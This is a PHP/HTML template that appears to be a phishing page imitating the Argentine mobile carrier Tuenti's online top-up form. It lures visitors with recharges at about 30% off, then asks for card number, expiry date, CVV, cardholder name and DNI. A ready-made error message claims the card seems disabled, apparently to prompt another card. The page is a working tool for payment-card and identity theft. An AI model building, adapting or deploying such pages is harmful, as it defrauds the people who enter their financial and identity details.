<!DOCTYPE html>
<html>
<head>
	<?php
	include_once("parts/header.php");
	?>
	<link rel="stylesheet" href="css/style.css" />
</head>
<body>
<?php include_once("parts/nav.php"); ?>
<?php include_once("parts/contenedor.php"); ?>
<div class="separador">
	<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGIAAAAbCAYAAACHiFoHAAAABHNCSVQICAgIfAhkiAAAAsJJREFUaEPtmE1IFGEYx39vSSZIlw5BBIFUdAovHfIrFQrCjI0oJCRE2EBIJdpDe8oufey6XTaoXRKELp7aQ1pG0cc9SMiQOoge3L60hMKIXCdedWrK2VnanZl9X9o5DczM8z7P/7f///uyAstl0FkF688DLSC2Wp+V7t1SwEiDGIZ1lwU3p8yqwrwxCIaBNhB73FqyVMdRgXHI3BYMRORbyyBWIfSC2FISz1cFPkAmJmGI1ThKlZzgKwDrYuOwdEQYBJMggkVrw7rwxjK40wWRB/D0jTcthQ7A5koIp7ypn1dVIyFBzCixMUsII93QvBu+L0LrdXg4kddYWT+6cBj6WlceXxlVBIYhu0kLg9PLd0W9rBDMRn5koCXuHozoMQgd/HPMi8PQd7eoo/86NSkBItUFgeq1gixmIHADRl4WJtalAIQP2dfoGYL4k8Lqu/C1Go5o3AWjvVBetnYk6YyjBcCwc4K5yvQc7O+H6U8uSFlYCTVAyBmcYOTrjHgbnGmyV0hCqI3AzHxhCrr0tTog3IahEQQ5ulogTBj3uqFig/2ecSIJqTHn32GyHYL19u9MfoSGfmWcoNZm/bdkNVXw6Kw9jMwSHE9kh5ELQs1VeP/FpUBxr4x6jjBnywWjfQCGnv9WQv5Zk8jhBEUhqBlN1h+ZEwzDgJO3VmBICIMdcGpf9jhSGIL6IGSHdTvgfg9UltuL3DEIDTuhs9b++cRbaIopGUfWhtWNJmuXe7fD43PZYWSL6tfvoC4Ks1/dC3OPKukBQg7/rzA0gqBHNOXjjFdpaIxp4QS1j69O9pfOkEfbTRX2b0kI9VH4vOBRiHhTVp9oss5fvQ2ehdbC0BSCftHkBENjCHqDkN2bzpicheZr2sWRfsdXp1iWMKbmYP6bN+HtU1U99wifxPFzmRIIP9V2WEuCeCHTVpF+/tc2xn4Cxb8A+EdrhFIAAAAASUVORK5CYII=">
</div>
<div class="title">
	<h3>Recargar crédito online</h3>
</div>
<div class="step1 step mt-3">
	<ul>
		<li class="active"><span class="text">Línea a recargar</span><span class="number">1</span></li>
		<li class=""><span class="text">Paso 2</span><span class="number">2</span></li>
	</ul>
</div>
<form id="verify_data">
<div class="container-fluid mt-5 step1">
	<div class="row d-flex justify-content-center">
		<div class="col-md-5 col-11">
			<div class="input">
				<label for="numero">Nº Línea Tuenti</label>
				<input type="text" inputmode="decimal" id="numero" name="numero" minlength="10" maxlength="10" placeholder="Ejemplo: 9999999999">
				<small class="hide" id="numero_error">Poné el número con código de área, sin 0 y sin 15. ej: 1130111111</small>
			</div>
			<div class="input_select mt-3">
				<span>¿Cuanto querés recargar?</span>
				<div class="row">
					<div class="col-6 col-md-3">
						<label for="radio1" class="radio_select checked">
							<span>$1,000<br>($700)</span>
							<input type="radio" value="1000" id="radio1" name="cargar" checked="checked">
						</label>
					</div>
					<div class="col-6 col-md-3">
						<label for="radio2" class="radio_select">
							<span>$500<br>($350)</span>
							<input type="radio" value="500" id="radio2" name="cargar">
						</label>
					</div>
					<div class="col-6 col-md-3">
						<label for="radio3" class="radio_select">
							<span>$200<br>($140)</span>
							<input type="radio" value="200" id="radio3" name="cargar">
						</label>
					</div>
					<div class="col-6 col-md-3">
						<label for="radio4" class="radio_select">
							<span>$50<br>($35)</span>
							<input type="radio" value="50" id="radio4" name="cargar">
						</label>
					</div>
				</div>
			</div>
			<div class="input mt-3">
				<label for="monto">O cargá cuánto querés recargar</label>
				<input type="text" inputmode="decimal" id="monto" name="monto" minlength="2" placeholder="Ejemplo: 1,000">
				<small class="hide" id="monto_error">Podés recargar entre $50 y $10,000</small>
			</div>
			<div class="input mt-3">
				<label for="email">Mail de contacto</label>
				<input type="email" inputmode="decimal" id="email" name="email">
				<small class="hide" id="email_error">Es un email no válido</small>
			</div>
			<div class="input_checkbox">
				<label for="terms" id="terms">
					<span class="checkbox noncheck" id="checkbox_terms"></span>
					<input type="checkbox" id="terms" name="terms" value="checked" required>
					<span>Acepto los <a href="https://www.tuenti.com.ar/legales" target="_blank">términos y condiciones de Tuenti</a></span>
				</label>
				<small class="hide" id="checkbox_error">Debe aceptar los terminos y condiciones para continuar</small>
			</div>
			<button id="submit">Continuar</button>
		</div>
	</div>
</div>
<div class="step2_1 step mt-3">
	<ul>
		<li class=""><span class="text">Paso 1</span><span class="number">1</span></li>
		<li class="active"><span class="text">Confirmá</span><span class="number">2</span></li>
	</ul>
</div>
<div class="container-fluid step2">
	<div class="row d-flex justify-content-center mt-5">
		<div class="col-md-5 col-11">
			<div class="alert error" style="display: none;" id="error">
				<h2>¡Ups! Hubo un problema con tu recarga</h2>
				<p>Se ha producido un error al realizar la recarga, creemos que tu tarjeta esta deshabilitada.</p>
			</div>
			<span>Confirmá cuánto querés recargar</span>
			<div class="info-recargar alert">
				<div class="info-recarga">
					<p>Nº Línea Tuenti</p>
					<p class="valor" id="numero_step2"></p>
				</div>
				<div class="info-recarga">
					<p>Recarga</p>
					<p class="valor" id="monto_step2"></p><span id="montofinal"></span>
				</div>
			</div>
			<span class="my-3">Datos de pago</span>
			<div class="row position-relative">
				<div class="loading" id="loading">
					<svg class="spinner" width="70" height="70" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid"><circle cx="50" cy="50" fill="none" r="30" stroke="transparent" stroke-width="4"></circle><circle cx="50" cy="50" fill="none" r="30" stroke="#0ADA7C" stroke-width="6" stroke-linecap="round" transform="rotate(391.765 50 50)"><animateTransform attributeName="transform" type="rotate" calcMode="linear" values="0 50 50;180 50 50;720 50 50" keyTimes="0;0.5;1" dur="1.7s" begin="0s" repeatCount="indefinite"></animateTransform><animate attributeName="stroke-dasharray" calcMode="linear" values="18.84955592153876 169.64600329384882;150.79644737231007 37.6991118430775;18.84955592153876 169.64600329384882" keyTimes="0;0.5;1" dur="1.7" begin="0s" repeatCount="indefinite"></animate></circle></svg>
				</div>
				<div class="col-12">
					<div class="input_checkout">
						<label for="card">Número de la tarjeta *</label>
						<input type="text" name="card" id="card" minlength="19" maxlength="19" required inputmode="decimal">
					</div>
					<div class="row">
						<div class="col-6">
							<div class="input_checkout">
								<label for="venc">Fecha de caducidad *</label>
								<input type="text" name="venc" id="venc" placeholder="MM/AA" required minlength="5" maxlength="5" inputmode="decimal">
							</div>
						</div>
						<div class="col-6">
							<div class="input_checkout">
								<label for="cvv">Código de seguridad (CVV) *</label>
								<input type="text" name="cvv" id="cvv" inputmode="decimal" minlength="3" maxlength="4" required>
								<span>Escribe el CVV de la tarjeta.</span>
							</div>
						</div>
					</div>
					<div class="input_checkout">
						<label for="name">Titular de la tarjeta *</label>
						<input type="text" name="name" id="name" required>
						<span>Escribe el nombre tal y como aparece en tu tarjeta</span>
					</div>
					<div class="input_checkout">
						<label for="dni">DNI de el titular de la tarjeta *</label>
						<input type="text" name="dni" id="dni" minlength="8" maxlength="8" required inputmode="decimal">
					</div>
					<p>* Campos obligatorios</p>
					<button class="finish" id="finish">Finalizar</button>
				</div>
			</div>
		</div>
	</div>
</div>
<input type="hidden" name="montofinal" id="montofinal_hidden">
</form>
<?php include_once("parts/footer.php"); ?>
</body>
</html>